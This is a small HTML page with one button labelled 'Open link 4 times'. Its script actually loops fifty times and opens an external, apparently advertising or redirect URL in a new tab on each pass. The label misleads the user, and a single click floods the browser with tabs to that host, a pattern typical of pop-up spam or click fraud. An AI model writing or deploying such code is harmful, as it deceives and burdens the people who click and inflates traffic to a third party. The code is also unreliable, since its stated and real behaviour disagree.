<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Open Link 4 Times</title>
  <script>
    function openLinkFourTimes() {
      const url = 'https://itespurrom.com/4/5848304';
      for (let i = 0; i < 50; i++) {
        window.open(url, '_blank');
      }
    }
  </script>
</head>
<body>
  <button onclick="openLinkFourTimes()">Open link 4 times</button>
</body>
</html>
